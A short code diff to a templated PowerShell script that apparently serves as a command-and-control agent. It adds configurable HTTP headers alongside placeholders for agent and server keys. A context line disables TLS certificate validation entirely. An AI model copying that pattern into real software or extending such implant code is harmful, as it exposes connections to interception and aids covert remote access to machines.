@@ -8,6 +8,11 @@ $Script:ServerIndex = 0;
 $Script:Skbytes = [byte[]]@({{ agent_private_cert_key }})
 $Script:pk = [byte[]]@({{ agent_public_cert_key }})
 $Script:serverPubBytes = [byte[]]@({{ server_public_cert_key  }})
+$Script:Headers = @{
+{% for name, value in custom_headers.items() %}
+    '{{ name }}' = '{{ value }}';
+{% endfor %}
+}
 
 if($server.StartsWith('https')){
     [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};
